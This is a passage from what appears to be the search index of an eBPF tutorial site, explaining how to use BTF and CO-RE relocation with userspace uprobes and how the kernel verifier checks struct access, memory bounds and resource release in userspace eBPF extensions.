<code>examples/btf-base-new</code>. The struct <code>data</code> is different in the two versions.</p> <p><code>examples/btf-base</code>:</p> <pre><code>// use a different struct\nstruct data {\n        int a;\n        int c;\n        int d;\n};\n\nint add_test(struct data *d) {\n    return d-&gt;a + d-&gt;c;\n}\n\nint main(int argc, char **argv) {\n    struct data d = {1, 3, 4};\n    printf(\"add_test(&amp;d) = %d\\n\", add_test(&amp;d));\n    return 0;\n}\n</code></pre> <p><code>examples/btf-base-new</code>:</p> <pre><code>struct data {\n        int a;\n        int b;\n        int c;\n        int d;\n};\n\nint add_test(struct data *d) {\n    return d-&gt;a + d-&gt;c;\n}\n\nint main(int argc, char **argv) {\n    struct data d = {1, 2, 3, 4};\n    printf(\"add_test(&amp;d) = %d\\n\", add_test(&amp;d));\n    return 0;\n}\n</code></pre> <p>We can use pahole and clang to generate the btf for each version of userspace applications. The pahole tool can simply generate BTF from the debug info: https://linux.die.net/man/1/pahole</p> <p>make examples and generate btf for them:</p> <pre><code>make -C example # it's like: pahole --btf_encode_detached base.btf btf-base.o\n</code></pre> <p>The we execute the eBPF program with the userspace program. for <code>btf-base</code>:</p> <pre><code>sudo ./uprobe examples/btf-base \n</code></pre> <p>And also the userspace program:</p> <pre><code>$ examples/btf-base\nadd_test(&amp;d) = 4\n</code></pre> <p>We will see:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\\\n           &lt;...&gt;-25458   [000] ...11 27694.081465: bpf_trace_printk: add_test(&amp;d) 1 + 3 = 4\n</code></pre> <p>For <code>btf-base-new</code>:</p> <pre><code>sudo ./uprobe examples/btf-base-new\n</code></pre> <p>And also the userspace program:</p> <pre><code>$ examples/btf-base-new\nadd_test(&amp;d) = 4\n</code></pre> <p>But we will see:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\\\n           &lt;...&gt;-25809   [001] ...11 27828.314224: bpf_trace_printk: add_test(&amp;d) 1 + 2 = 3\n</code></pre> <p>The result is different, because the struct <code>data</code> is different in the two versions. The eBPF program can't be compatible with different versions of the userspace program, so we cannot get the correct information.</p>"},{"location":"tutorials/38-btf-uprobe/#use-btf-for-userspace-program","title":"Use BTF for userspace program","text":"<p>Comment the <code>#define BPF_NO_PRESERVE_ACCESS_INDEX</code> in the <code>uprobe.bpf.c</code> to make sure the eBPF program can be compiled with BTF for <code>struct data</code>.</p> <pre><code>#define BPF_NO_GLOBAL_DATA\n// #define BPF_NO_PRESERVE_ACCESS_INDEX\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\n#ifndef BPF_NO_PRESERVE_ACCESS_INDEX\n#pragma clang attribute push (__attribute__((preserve_access_index)), apply_to = record)\n#endif\n\nstruct data {\n        int a;\n        int c;\n        int d;\n};\n\n#ifndef BPF_NO_PRESERVE_ACCESS_INDEX\n#pragma clang attribute pop\n#endif\n\n\nSEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    int a = 0, c = 0;\n    bpf_probe_read_user(&amp;a, sizeof(a), &amp;d-&gt;a);\n    bpf_probe_read_user(&amp;c, sizeof(c), &amp;d-&gt;c);\n    bpf_printk(\"add_test(&amp;d) %d + %d = %d\\n\", a, c,  a + c);\n    return a + c;\n}\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>The record of <code>struct data</code> is preserved in the eBPF program. Then, we can use the <code>btf-base.btf</code> to compile the eBPF program.</p> <p>Merge user btf with kernel btf, so we have a complete btf for the kernel and userspace:</p> <pre><code>./merge-btf /sys/kernel/btf/vmlinux examples/base.btf target-base.btf\n</code></pre> <p>Then we execute the eBPF program with the userspace program. for <code>btf-base</code>:</p> <pre><code>$ sudo ./uprobe examples/btf-base target-base.btf\n...\nlibbpf: prog 'add_test': relo #1: patched insn #4 (ALU/ALU64) imm 0 -&gt; 0\nlibbpf: prog 'add_test': relo #2: &lt;byte_off&gt; [7] struct data.c (0:1 @ offset 4)\nlibbpf: prog 'add_test': relo #2: matching candidate #0 &lt;byte_off&gt; [133110] struct data.c (0:1 @ offset 4)\nlibbpf: prog 'add_test': relo #2: patched insn #11 (ALU/ALU64) imm 4 -&gt; 4\n...\n</code></pre> <p>Execute the userspace program and get result:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n[sudo] password for yunwei37: \n           &lt;...&gt;-26740   [001] ...11 28180.156220: bpf_trace_printk: add_test(&amp;d) 1 + 3 = 4\n</code></pre> <p>Also, we do the same for another version of the userspace program <code>btf-base-new</code>:</p> <pre><code>$ ./merge-btf /sys/kernel/btf/vmlinux examples/base-new.btf target-base-new.btf\n$ sudo ./uprobe examples/btf-base-new target-base-new.btf\n....\nlibbpf: sec 'uprobe/examples/btf-base:add_test': found 3 CO-RE relocations\nlibbpf: CO-RE relocating [2] struct pt_regs: found target candidate [357] struct pt_regs in [vmlinux]\nlibbpf: prog 'add_test': relo #0: &lt;byte_off&gt; [2] struct pt_regs.di (0:14 @ offset 112)\nlibbpf: prog 'add_test': relo #0: matching candidate #0 &lt;byte_off&gt; [357] struct pt_regs.di (0:14 @ offset 112)\nlibbpf: prog 'add_test': relo #0: patched insn #0 (LDX/ST/STX) off 112 -&gt; 112\nlibbpf: CO-RE relocating [7] struct data: found target candidate [133110] struct data in [vmlinux]\nlibbpf: prog 'add_test': relo #1: &lt;byte_off&gt; [7] struct data.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #1: matching candidate #0 &lt;byte_off&gt; [133110] struct data.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #1: patched insn #4 (ALU/ALU64) imm 0 -&gt; 0\nlibbpf: prog 'add_test': relo #2: &lt;byte_off&gt; [7] struct data.c (0:1 @ offset 4)\nlibbpf: prog 'add_test': relo #2: matching candidate #0 &lt;byte_off&gt; [133110] struct data.c (0:2 @ offset 8)\nlibbpf: prog 'add_test': relo #2: patched insn #11 (ALU/ALU64) imm 4 -&gt; 8\nlibbpf: elf: symbol address match for 'add_test' in 'examples/btf-base-new': 0x1140\nSuccessfully started! Press Ctrl+C to stop.\n</code></pre> <p>The result is correct:</p> <pre><code>$ sudo cat /sys/kernel/debug/tracing/trace_pipe\n[sudo] password for yunwei37: \n           &lt;...&gt;-26740   [001] ...11 28180.156220: bpf_trace_printk: add_test(&amp;d) 1 + 3 = 4\n</code></pre> <p>For complete source code, you can visit https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/38-btf-uprobe for more details.</p> <p>The eBPF uprobe tracing program almost doesn't need any modifications. We just need to load the BTF containing the offsets of kernel and user-space structures. This is the same usage as enabling CO-RE on older kernel versions without BTF information:</p> <pre><code>    LIBBPF_OPTS(bpf_object_open_opts , opts,\n    );\n    LIBBPF_OPTS(bpf_uprobe_opts, uprobe_opts);\n    if (argc != 3 &amp;&amp; argc != 2) {\n        fprintf(stderr, \"Usage: %s &lt;example-name&gt; [&lt;external-btf&gt;]\\n\", argv[0]);\n        return 1;\n    }\n    if (argc == 3)\n        opts.btf_custom_path = argv[2];\n\n    /* Set up libbpf errors and debug info callback */\n    libbpf_set_print(libbpf_print_fn);\n\n    /* Cleaner handling of Ctrl-C */\n    signal(SIGINT, sig_handler);\n    signal(SIGTERM, sig_handler);\n\n    /* Load and verify BPF application */\n    skel = uprobe_bpf__open_opts(&amp;opts);\n    if (!skel) {\n        fprintf(stderr, \"Failed to open and load BPF skeleton\\n\");\n        return 1;\n    }\n</code></pre> <p>In fact, the BTF implementation for relocation requires two parts: the compile-time BTF information carried by the BPF program, and the BTF information of the kernel when loading the eBPF program. When actually loading the eBPF program, libbpf will modify potentially incorrect eBPF instructions based on the accurate BTF information of the current kernel, ensuring compatibility across different kernel versions.</p> <p>Interestingly, libbpf does not differentiate whether these BTF information come from user-space programs or the kernel. Therefore, by merging the user-space BTF information with kernel BTF and provide them to libbpf, the problem is solved.</p> <p>And also, since the relocation is happened in userspace loader(like libbpf), both kernel eBPF runtime and userspace eBPF runtimes(Such as bpftime) can benefit from the CO-RE. bpftime (https://github.com/eunomia-bpf/bpftime) is an open-source user-space eBPF runtime based on LLVM JIT/AOT. It enables the execution of eBPF programs in user space, compatible with kernel-space eBPF. While supporting uprobes, syscall trace, and general plugin extensions, it avoids the context switching between kernel and user spaces, thereby enhancing the execution efficiency of uprobe programs. With the support of libbpf and BTF, bpftime can also dynamically extend user-space applications, achieving compatibility across different versions of user-space programs.</p> <p>For more details about BTF relocation, you may refer to https://nakryiko.com/posts/bpf-core-reference-guide/</p>"},{"location":"tutorials/38-btf-uprobe/#conclusion","title":"Conclusion","text":"<ul> <li>Flexibility and Compatibility: The use of BTF in user-space eBPF programs greatly enhances their flexibility and compatibility across different versions of user-space applications and libraries.</li> <li>Reduced Complexity: This approach significantly reduces the complexity involved in maintaining eBPF programs for different versions of user-space applications, as it eliminates the need for multiple program versions.</li> <li>Potential for Broader Application: While your example focused on SSL/TLS monitoring, this methodology may has broader applications in performance monitoring, security, and debugging of user-space applications.</li> </ul> <p>This example showcases a significant advancement in the practical application of eBPF, extending its powerful features to more dynamically handle user-space applications in a Linux environment. It's a compelling solution for software engineers and system administrators dealing with the complexities of modern Linux systems.</p> <p>If you want to learn more about eBPF knowledge and practices, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ to get more examples and complete tutorials.</p> <p>Share on  Share on </p>"},{"location":"tutorials/38-btf-uprobe/test-verify/","title":"using BTF to verify userspace eBPF extensions","text":"<p>Here we will show how to use the type information of userspace application to verify the eBPF program which will access the userspace memory(include valid or invalid data structure memory access, pointer access, etc), and how to verify the resource allocation and deallocation of a psudo ufuncs(Userspace Function) which can be accessed by eBPF program in bpftime.</p> <p>This is using kernel eBPF verifier to verify userspace eBPF extensions, the userspace eBPF extensions can be uprobe or other eBPF programs, it can be run in the kernel space or in bpftime.</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/#usage","title":"Usage","text":"<p>The application developer or the extension user who wants to use the eBPF program for userspace application needs to provide:</p> <ol> <li>The BTF information of the userspace application. It can be generated by the compiler or from the DWARF information.</li> <li>The psudo ufunc information if the eBPF program will access the resource allocation and deallocation function of userspace application.</li> </ol> <p>By reusing the kernel verifier, we can provide:</p> <ol> <li>CO-RE relocation, if the userspace application has different version, and the struct/function type is different.</li> <li>Type checking and variable access checking for the userspace extension.</li> <li>Memory access checking for the userspace extension, so no need to copy the data.</li> <li>Resource allocation and deallocation function access checking.</li> </ol>"},{"location":"tutorials/38-btf-uprobe/test-verify/#the-btf-format","title":"The BTF format","text":"<p>The BTF format is a binary format that contains the type information of the progam.</p> <p>The based program can be found in the examples directory, they represent the different version of host userspace applications, include:</p> <ul> <li><code>btf-base</code>: the base version of <code>btf-base-complete</code>, which contain the type information of <code>struct data</code> the same as verify-failed-no-btf/uprobe.bpf.c.  </li> <li><code>btf-base-new</code>: the new version of <code>btf-base</code>, which contains the type information of <code>struct data</code> different from <code>btf-base</code> and verify-failed-btf/uprobe.bpf.c. We can use it to test CO-RE relocation.</li> <li><code>btf-base-complete</code>: the complete version of <code>btf-base</code>, which contains all the types that are used in the eBPF program, and a resource allocation and deallocation function.</li> </ul> <p>run <code>make -C ../</code> in this directory to generate the BTF files.</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/#verify-struct-data-access","title":"Verify struct data access","text":"<p>The userspace application has data struct like</p> <p>version 1:</p> <pre><code>struct data {\n    int a;\n    int c;\n    int d;\n};\n</code></pre> <p>or </p> <p>version 2:</p> <pre><code>struct data {\n    int a;\n    int b;\n    int c;\n    int d;\n};\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/#11-verify-failed-without-btf-for-userspace-application","title":"1.1 Verify failed without BTF for userspace application","text":"<p>The eBPF program has</p> <pre><code>struct data {\n    int a;\n    int c;\n    int d;\n};\n\nSEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    int a = 0, c = 0;\n    bpf_probe_read_user(&amp;a, sizeof(a), &amp;d-&gt;a);\n    bpf_probe_read_user(&amp;c, sizeof(c), &amp;d-&gt;c);\n    bpf_printk(\"add_test(&amp;d) %d + %d = %d\\n\", a, c,  a + c);\n    return a + c;\n}\n</code></pre> <p>If no BTF for userspace application is provided, the verification will fail.</p> <pre><code>$ sudo ./verify-failed-no-btf/uprobe ../examples/btf-base \n\nlibbpf: prog 'add_test': -- BEGIN PROG LOAD LOG --\n0: R1=ctx() R10=fp0\n; int BPF_UPROBE(add_test, struct data *d) @ uprobe.bpf.c:23\n0: (79) r6 = *(u64 *)(r1 +112)        ; R1=ctx() R6_w=scalar()\n1: (b7) r7 = 0                        ; R7_w=0\n; int a = 0, c = 0; @ uprobe.bpf.c:25\n2: (63) *(u32 *)(r10 -4) = r7         ; R7_w=0 R10=fp0 fp-8=0000????\n3: (63) *(u32 *)(r10 -8) = r7         ; R7_w=0 R10=fp0 fp-8=00000\n4: &lt;invalid CO-RE relocation&gt;\nfailed to resolve CO-RE relocation &lt;byte_off&gt; [17] struct data.a (0:0 @ offset 0)\nprocessed 5 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0\n-- END PROG LOAD LOG --\nlibbpf: prog 'add_test': failed to load: -22\nlibbpf: failed to load object 'uprobe_bpf'\nlibbpf: failed to load BPF skeleton 'uprobe_bpf': -22\nFailed to load and verify BPF skeleton\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/#12-verify-success-with-btf-for-struct-access-and-relocation","title":"1.2 Verify success with BTF for struct access and relocation","text":"<p>See ../README.md for more details.</p> <pre><code>$ sudo ./verify-failed-no-btf/uprobe ../examples/btf-base ../target-base.btf\n\nlibbpf: prog 'add_test': relo #0: &lt;byte_off&gt; [2] struct pt_regs.di (0:14 @ offset 112)\nlibbpf: prog 'add_test': relo #0: matching candidate #0 &lt;byte_off&gt; [88] struct pt_regs.di (0:14 @ offset 112)\nlibbpf: prog 'add_test': relo #0: patched insn #0 (LDX/ST/STX) off 112 -&gt; 112\nlibbpf: CO-RE relocating [17] struct data: found target candidate [143229] struct data in [vmlinux]\nlibbpf: prog 'add_test': relo #1: &lt;byte_off&gt; [17] struct data.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #1: matching candidate #0 &lt;byte_off&gt; [143229] struct data.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #1: patched insn #4 (ALU/ALU64) imm 0 -&gt; 0\nlibbpf: prog 'add_test': relo #2: &lt;byte_off&gt; [17] struct data.c (0:1 @ offset 4)\nlibbpf: prog 'add_test': relo #2: matching candidate #0 &lt;byte_off&gt; [143229] struct data.c (0:1 @ offset 4)\nlibbpf: prog 'add_test': relo #2: patched insn #11 (ALU/ALU64) imm 4 -&gt; 4\nlibbpf: map '.rodata.str1.1': created successfully, fd=3\nlibbpf: elf: symbol address match for 'add_test' in '../examples/btf-base': 0x1140\nSuccessfully started! Press Ctrl+C to stop.\n</code></pre> <p>It can successfully find the type information of <code>struct data</code> in the BTF file and perform the verification.</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/#13-verify-failed-with-invalid-userspace-struct-var-access","title":"1.3 Verify failed with invalid userspace struct var access","text":"<p>The eBPF program is:</p> <pre><code>struct data {\n    int a;\n    int e;\n    int d;\n};\n\nSEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    int a = 0, e = 0;\n    bpf_probe_read_user(&amp;a, sizeof(a), &amp;d-&gt;a);\n    bpf_probe_read_user(&amp;e, sizeof(e), &amp;d-&gt;e);\n    bpf_printk(\"add_test(&amp;d) %d + %d = %d\\n\", a, e,  a + e);\n    return a + e;\n}\n</code></pre> <p>If the extension (BPF program) access the invalid userspace struct variable, the verification will fail.</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/#verify-memory-pointer-access","title":"Verify memory pointer access","text":"<p>See verify-memory-access directory.</p> <p>The data struct is:</p> <pre><code>struct deep_memory_block {\n    int a;\n    char b[10];\n};\n\nstruct inner_memory_block {\n    int a;\n    char b[10];\n    struct deep_memory_block *deep;\n};\n\nstruct data {\n        int a;\n        int b;\n        int c;\n        int d;\n        // represent a pointer to a memory block\n        struct inner_memory_block *inner;\n};\n</code></pre> <p>This include a deep memory access through pointers.</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/#memory-access-success-for-inner-data-structs-without-deep-copy","title":"Memory access success for inner data structs without deep copy","text":"<p>The eBPF program is:</p> <pre><code>SEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    int inner_deep_a = BPF_CORE_READ_USER(d, inner, deep, a);\n    bpf_printk(\"inner_deep_a = %d\\n\", inner_deep_a);\n    char* inner_deep_b = BPF_CORE_READ_USER(d, inner, deep, b);\n    bpf_printk(\"inner_deep_b[9] = %c\\n\", inner_deep_b[9]);\n    return 0;\n}\n</code></pre> <p>Run it:</p> <pre><code>$ sudo ./verify-memory-access/uprobe ../examples/btf-base-complete ../target-base-complete.btf \n\nlibbpf: sec 'uprobe/examples/btf-base:add_test': found 7 CO-RE relocations\nlibbpf: CO-RE relocating [2] struct pt_regs: found target candidate [88] struct pt_regs in [vmlinux]\nlibbpf: prog 'add_test': relo #0: &lt;byte_off&gt; [2] struct pt_regs.di (0:14 @ offset 112)\nlibbpf: prog 'add_test': relo #0: matching candidate #0 &lt;byte_off&gt; [88] struct pt_regs.di (0:14 @ offset 112)\nlibbpf: prog 'add_test': relo #0: patched insn #0 (LDX/ST/STX) off 112 -&gt; 112\nlibbpf: CO-RE relocating [17] struct data: found target candidate [143228] struct data in [vmlinux]\nlibbpf: prog 'add_test': relo #1: &lt;byte_off&gt; [17] struct data.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #1: matching candidate #0 &lt;byte_off&gt; [143228] struct data.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #1: patched insn #4 (ALU/ALU64) imm 0 -&gt; 0\nlibbpf: prog 'add_test': relo #2: &lt;byte_off&gt; [17] struct data.c (0:2 @ offset 8)\nlibbpf: prog 'add_test': relo #2: matching candidate #0 &lt;byte_off&gt; [143228] struct data.c (0:2 @ offset 8)\nlibbpf: prog 'add_test': relo #2: patched insn #11 (ALU/ALU64) imm 8 -&gt; 8\nlibbpf: prog 'add_test': relo #3: &lt;byte_off&gt; [17] struct data.inner (0:4 @ offset 16)\nlibbpf: prog 'add_test': relo #3: matching candidate #0 &lt;byte_off&gt; [143228] struct data.inner (0:4 @ offset 16)\nlibbpf: prog 'add_test': relo #3: patched insn #38 (ALU/ALU64) imm 16 -&gt; 16\nlibbpf: CO-RE relocating [19] struct inner_memory_block: found target candidate [143231] struct inner_memory_block in [vmlinux]\nlibbpf: prog 'add_test': relo #4: &lt;byte_off&gt; [19] struct inner_memory_block.deep (0:2 @ offset 16)\nlibbpf: prog 'add_test': relo #4: matching candidate #0 &lt;byte_off&gt; [143231] struct inner_memory_block.deep (0:2 @ offset 16)\nlibbpf: prog 'add_test': relo #4: patched insn #46 (ALU/ALU64) imm 16 -&gt; 16\nlibbpf: CO-RE relocating [24] struct deep_memory_block: found target candidate [143234] struct deep_memory_block in [vmlinux]\nlibbpf: prog 'add_test': relo #5: &lt;byte_off&gt; [24] struct deep_memory_block.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #5: matching candidate #0 &lt;byte_off&gt; [143234] struct deep_memory_block.a (0:0 @ offset 0)\nlibbpf: prog 'add_test': relo #5: patched insn #52 (ALU/ALU64) imm 0 -&gt; 0\nlibbpf: prog 'add_test': relo #6: &lt;byte_off&gt; [24] struct deep_memory_block.b (0:1 @ offset 4)\nlibbpf: prog 'add_test': relo #6: matching candidate #0 &lt;byte_off&gt; [143234] struct deep_memory_block.b (0:1 @ offset 4)\nlibbpf: prog 'add_test': relo #6: patched insn #84 (ALU/ALU64) imm 4 -&gt; 4\nlibbpf: map '.rodata.str1.1': created successfully, fd=3\nlibbpf: elf: symbol address match for 'add_test' in '../examples/btf-base-complete': 0x1160\nSuccessfully started! Press Ctrl+C to stop.\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/#memory-access-failed-for-inner-data-structs-because-of-out-of-bounds","title":"Memory access failed for inner data structs because of out of bounds","text":"<p>If we change the eBPF program to access the memory out of bounds, the verification will fail.</p> <pre><code>SEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    int inner_deep_a = BPF_CORE_READ_USER(d, inner, deep, a);\n    bpf_printk(\"inner_deep_a = %d\\n\", inner_deep_a);\n    char* inner_deep_b = BPF_CORE_READ_USER(d, inner, deep, b);\n    // memory access out of bounds\n    bpf_printk(\"inner_deep_b[11] = %c\\n\", inner_deep_b[100]);\n    return 0;\n}\n</code></pre> <p>test:</p> <pre><code>$ sudo ./verify-memory-access/uprobe_failed ../examples/btf-base-complete ../target-base-complete.btf \n...\n; bpf_printk(\"inner_deep_b[11] = %c\\n\", inner_deep_b[100]); @ uprobe_failed.bpf.c:44\n57: (6b) *(u16 *)(r10 -12) = r1       ; R1_w=2659 R10=fp0 fp-16=??mm?mmm\n58: (b7) r1 = 622869792               ; R1_w=0x25203d20\n59: (63) *(u32 *)(r10 -16) = r1       ; R1_w=0x25203d20 R10=fp0 fp-16=??mm0x25203d20\n60: (18) r1 = 0x5d31315b625f7065      ; R1_w=0x5d31315b625f7065\n62: (7b) *(u64 *)(r10 -24) = r1       ; R1_w=0x5d31315b625f7065 R10=fp0 fp-24_w=0x5d31315b625f7065\n63: (7b) *(u64 *)(r10 -32) = r8       ; R8=0x65645f72656e6e69 R10=fp0 fp-32_w=0x65645f72656e6e69\n64: (73) *(u8 *)(r10 -10) = r9        ; R9=0 R10=fp0 fp-16=?0mmmmmm\n65: (71) r3 = *(u8 *)(r10 +68)\ninvalid read from stack R10 off=68 size=1\nprocessed 63 insns (limit 1000000) max_states_per_insn 0 total_states 3 peak_states 3 mark_read 2\n-- END PROG LOAD LOG --\nlibbpf: prog 'add_test': failed to load: -13\nlibbpf: failed to load object 'uprobe_failed_bpf'\nlibbpf: failed to load BPF skeleton 'uprobe_failed_bpf': -13\nFailed to load and verify BPF skeleton\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/#verify-resource-allocation-and-deallocation-with-psudo-ufuncs","title":"Verify resource allocation and deallocation with psudo ufuncs","text":"<p>See verify-resource-allocation directory.</p> <p>First, give kernel the psudo ufunc information through the kernel module:</p> <pre><code>cd module\nmake\nsudo insmod hello.ko\n</code></pre> <p>Check the kernel output:</p> <pre><code>$ sudo dmesg | tail\n[83824.574456] Hello, world!\n[83824.574952] bpf_kfunc_example: Module loaded successfully\n</code></pre> <p>The psudo ufunc information is like:</p> <pre><code>__bpf_kfunc struct data *my_alloc_data(void)\n{\n    // here we only use it for verification\n    return NULL;\n}\n\n__bpf_kfunc void my_free_data(struct data *d)\n{\n    // here we only use it for verification\n    return;\n}\n/*Auto generated code end*/\n\n__bpf_kfunc_end_defs();\n\nBTF_KFUNCS_START(bpf_kfunc_example_ids_set)\nBTF_ID_FLAGS(func, my_alloc_data, KF_ACQUIRE | KF_RET_NULL)\nBTF_ID_FLAGS(func, my_free_data, KF_RELEASE)\nBTF_KFUNCS_END(bpf_kfunc_example_ids_set)\n</code></pre> <p>Note in previous approach, we just use the BTF information of userspace program to verify the eBPF program, so we don't need a additional kernel module. In this case, the kernel may try to link the psudo kfunc to the eBPF program. If it don't have a implementation in the module, the verification will fail.</p> <p>And this can only be run in userspace, since run it in kernel is meaningless(The \"ufunc\" is just a placeholder kfunc, don't have a implementation in the kernel).</p>"},{"location":"tutorials/38-btf-uprobe/test-verify/#verify-resource-allocation-and-deallocation-success-with-psudo-ufunc-information","title":"Verify resource allocation and deallocation success with psudo ufunc information","text":"<p>The eBPF progam is like:</p> <pre><code>SEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    struct data *alloced = my_alloc_data();\n    if (alloced == NULL) {\n        bpf_printk(\"Failed to allocate data\\n\");\n        return 0;\n    }\n    my_free_data(alloced);\n    return 0;\n}\n</code></pre> <p>Then you can run it successfuly:</p> <pre><code>$ sudo ./verify-resource-allocation/uprobe ../examples/btf-base-complete ../target-base-complete.btf \n\nlibbpf: loaded kernel BTF from '/sys/kernel/btf/vmlinux'\nlibbpf: extern (func ksym) 'my_alloc_data': resolved to hello [143233]\nlibbpf: extern (func ksym) 'my_free_data': resolved to hello [143235]\nlibbpf: map '.rodata.str1.1': created successfully, fd=3\nlibbpf: elf: symbol address match for 'add_test' in '../examples/btf-base-complete': 0x1160\nSuccessfully started! Press Ctrl+C to stop.\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/#verify-resource-allocation-and-deallocation-failed","title":"Verify resource allocation and deallocation failed","text":"<p>If don't release resource allocated by userspace application, the verification will fail.</p> <p>code:</p> <pre><code>SEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    struct data *alloced = my_alloc_data();\n    if (alloced == NULL) {\n        bpf_printk(\"Failed to allocate data\\n\");\n        return 0;\n    }\n    return 0;\n}\n</code></pre> <p>run it:</p> <pre><code>$ sudo ./verify-resource-allocation/uprobe_failed ../examples/btf-base-complete ../target-base-complete.btf \n\n0: R1=ctx() R10=fp0\n; struct data *alloced = my_alloc_data(); @ uprobe_failed.bpf.c:43\n0: (85) call my_alloc_data#143233     ; R0_w=ptr_or_null_data(id=2,ref_obj_id=2) refs=2\n; if (alloced == NULL) { @ uprobe_failed.bpf.c:44\n1: (55) if r0 != 0x0 goto pc+15 17: R0_w=ptr_data(ref_obj_id=2) R10=fp0 refs=2\n17: (b7) r0 = 0                       ; R0_w=0 refs=2\n18: (95) exit\nUnreleased reference id=2 alloc_insn=0\nprocessed 18 insns (limit 1000000) max_states_per_insn 1 total_states 1 peak_states 1 mark_read 0\n-- END PROG LOAD LOG --\nlibbpf: prog 'add_test': failed to load: -22\nlibbpf: failed to load object 'uprobe_failed_bpf'\nlibbpf: failed to load BPF skeleton 'uprobe_failed_bpf': -22\nFailed to load and verify BPF skeleton\n</code></pre> <p>Or if you don't check the return value of <code>my_alloc_data</code>, the verification will also fail, like:</p> <pre><code>SEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    struct data *alloced = my_alloc_data();\n\n    my_free_data(alloced);\n    return 0;\n}\n</code></pre> <p>run it:</p> <pre><code>$ sudo ./verify-resource-allocation/uprobe ../examples/btf-base-complete ../target-base-complete.btf \n\nlibbpf: loaded kernel BTF from '/sys/kernel/btf/vmlinux'\nlibbpf: extern (func ksym) 'my_alloc_data': resolved to hello [143233]\nlibbpf: extern (func ksym) 'my_free_data': resolved to hello [143235]\nlibbpf: prog 'add_test': BPF program load failed: Permission denied\nlibbpf: prog 'add_test': -- BEGIN PROG LOAD LOG --\n0: R1=ctx() R10=fp0\n; struct data *alloced = my_alloc_data(); @ uprobe.bpf.c:43\n0: (85) call my_alloc_data#143233     ; R0_w=ptr_or_null_data(id=2,ref_obj_id=2) refs=2\n; my_free_data(alloced); @ uprobe.bpf.c:45\n1: (bf) r1 = r0                       ; R0_w=ptr_or_null_data(id=2,ref_obj_id=2) R1_w=ptr_or_null_data(id=2,ref_obj_id=2) refs=2\n2: (85) call my_free_data#143235\nPossibly NULL pointer passed to trusted arg0\nprocessed 3 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0\n-- END PROG LOAD LOG --\nlibbpf: prog 'add_test': failed to load: -13\nlibbpf: failed to load object 'uprobe_bpf'\nlibbpf: failed to load BPF skeleton 'uprobe_bpf': -13\nFailed to load and verify BPF skeleton\n</code></pre>"},{"location":"tutorials/38-btf-uprobe/test-verify/#run-ufunc-in-userspace","title":"Run ufunc in userspace","text":"<p>Since it's meaningless to run ufunc in kernel, so we can only run it in userspace.</p> <p>load eBPF program with ufunc:</p> <pre><code>LD_PRELOAD=/home/yunwei37/.bpftime/libbpftime-syscall-server.so ./verify-resource-allocation/uprobe ../examples/btf-base-complete ../target-base-complete.btf \n</code></pre> <p>And run the userspace program:</p> <pre><code># LD_PRELOAD=/home/yunwei37/.bpftime/libbpftime-agent.so ../examples/btf-base-complete\n\nmy_alloc_data\nmy_free_data\n</code></pre> <p>Share on  Share on </p>"},{"location":"tutorials/38-btf-uprobe/test-verify/minimal/","title":"minimal examples","text":"<ul> <li><code>uprobe/uretprobe</code>: trace userspace functions at start or and. No affect the control flow.</li> <li><code>uprobe-override</code>: replace the userspace function with a eBPF function</li> </ul> <p>You can use <code>bpf_override_return</code> to change the control flow and return value of the function.</p> <pre><code>/*\n * bpf_override_return\n *\n *  Used for error injection, this helper uses kprobes to override\n *  the return value of the probed function, and to set it to *rc*.\n *  The first argument is the context *regs* on which the kprobe\n *  works.\n *\n *  This helper works by setting the PC (program counter)\n *  to an override function which is run in place of the original\n *  probed function. This means the probed function is not run at\n *  all. The replacement function just returns with the required\n *  value.\n *\n *  This helper has security implications, and thus is subject to\n *  restrictions. It is only available if the kernel was compiled\n *  with the **CONFIG_BPF_KPROBE_OVERRIDE** configuration\n *  option, and in this case it only works on functions tagged with\n *  **ALLOW_ERROR_INJECTION** in the kernel code.\n *\n *  Also, the helper is only available for the architectures having\n *  the CONFIG_FUNCTION_ERROR_INJECTION option. As of this writing,\n *  x86 architecture is the only one to support this feature.\n *\n * Returns\n *  0\n */\nstatic long (*bpf_override_return)(struct pt_regs *regs, __u64 rc) = (void *) 